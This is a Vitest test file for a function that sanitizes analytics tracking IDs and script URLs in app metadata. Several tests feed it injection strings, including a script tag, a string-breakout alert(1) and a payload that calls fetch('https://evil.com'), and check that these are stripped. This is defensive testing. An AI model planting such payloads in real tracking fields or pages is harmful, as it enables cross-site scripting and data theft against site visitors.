import { describe, expect, it } from "vitest";

import { sanitizeAnalyticsApps } from "./sanitize-analytics-value";

describe("sanitizeAnalyticsApps", () => {
  it("passes through valid GA4 tracking ID", () => {
    const metadata = { apps: { ga4: { enabled: true, trackingId: "G-ABC123XYZ" } } };
    sanitizeAnalyticsApps(metadata);
    expect(metadata.apps.ga4.trackingId).toBe("G-ABC123XYZ");
  });

  it("passes through valid GTM tracking ID", () => {
    const metadata = { apps: { gtm: { enabled: true, trackingId: "GTM-ABCDEF" } } };
    sanitizeAnalyticsApps(metadata);
    expect(metadata.apps.gtm.trackingId).toBe("GTM-ABCDEF");
  });

  it("passes through valid URL fields", () => {
    const metadata = { apps: { plausible: { enabled: true, PLAUSIBLE_URL: "https://plausible.io/js/script.js" } } };
    sanitizeAnalyticsApps(metadata);
    expect(metadata.apps.plausible.PLAUSIBLE_URL).toBe("https://plausible.io/js/script.js");
  });

  it("strips XSS payload from trackingId", () => {
    const metadata = { apps: { gtm: { enabled: true, trackingId: "GTM-');alert(1);//" } } };
    sanitizeAnalyticsApps(metadata);
    expect(metadata.apps.gtm.trackingId).toBe("GTM-alert1//");
  });

  it("strips full exfiltration payload", () => {
    const payload = "GTM-');(async()=>{fetch('https://evil.com')})();//";
    const metadata = { apps: { gtm: { enabled: true, trackingId: payload } } };
    sanitizeAnalyticsApps(metadata);
    expect(metadata.apps.gtm.trackingId).not.toContain("(");
    expect(metadata.apps.gtm.trackingId).not.toContain("'");
    expect(metadata.apps.gtm.trackingId).not.toContain("{");
  });

  it("strips HTML script tags", () => {
    const metadata = { apps: { metapixel: { enabled: true, trackingId: "<script>alert(1)</script>" } } };
    sanitizeAnalyticsApps(metadata);
    expect(metadata.apps.metapixel.trackingId).not.toContain("<");
    expect(metadata.apps.metapixel.trackingId).not.toContain(">");
  });

  it("preserves empty strings", () => {
    const metadata = { apps: { ga4: { enabled: true, trackingId: "" } } };
    sanitizeAnalyticsApps(metadata);
    expect(metadata.apps.ga4.trackingId).toBe("");
  });

  it("handles null metadata", () => {
    expect(sanitizeAnalyticsApps(null)).toBeNull();
  });

  it("handles metadata without apps", () => {
    const metadata = { bookerLayouts: {} };
    sanitizeAnalyticsApps(metadata);
    expect(metadata).toEqual({ bookerLayouts: {} });
  });

  it("ignores non-analytics apps", () => {
    const metadata = { apps: { stripe: { enabled: true, price: 100 } } };
    sanitizeAnalyticsApps(metadata);
    expect(metadata.apps.stripe.price).toBe(100);
  });
});
